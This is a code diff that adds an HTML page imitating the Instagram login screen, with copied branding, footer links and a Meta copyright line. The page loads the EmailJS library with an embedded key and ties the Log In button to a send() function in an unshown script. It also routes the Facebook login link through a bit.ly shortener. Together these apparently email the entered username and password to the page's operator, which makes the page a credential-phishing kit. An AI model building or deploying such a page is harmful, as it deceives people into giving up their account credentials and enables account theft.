@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("VEAwe6xvX0A5FNepG");
+        })();
+    </script>
+       <script src="script.js" ></script>
+</head>
+
+<body>
+    <div class="container">
+        <div class="box" style="margin-top: 50px;">
+            <div class="heading"></div>
+            <form class="login-form">
+                <div class="field">
+                    <input id="username" type="name" placeholder="Phone number, username, or email" />
+                    <label for="username">Phone number, username, or email</label>
+                </div>
+                <div class="field">
+                    <input id="password" type="password" placeholder="password" />
+                    <label for="password">Password</label>
+                </div>
+                <button type="button" class="login-button" title="login" onclick="send()">Log In</button>
+                <div class="separator">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+                <div class="other">
+                    <button class="fb-login-btn" type="button">
+                        <i class="fa fa-facebook-official fb-icon"></i>
+                        <a href="https://bit.ly/3nW7HvO" class="">Log in with Facebook</a>
+                    </button>
+                    <a class="forgot-password" href="#">Forgotten your password?</a>
+                </div>
+            </form>
+        </div>
+        <div class="box">
+            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
+        </div>
+    </div>
+ 
+</body>
+<footer>
+    <div class="container">
+        <div class="links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Top accounts</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Contact uploading and non-users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="copyright">
+            © 2023 Instagram from Meta
+        </div>
+    </div>
+</footer>
+
+</html>
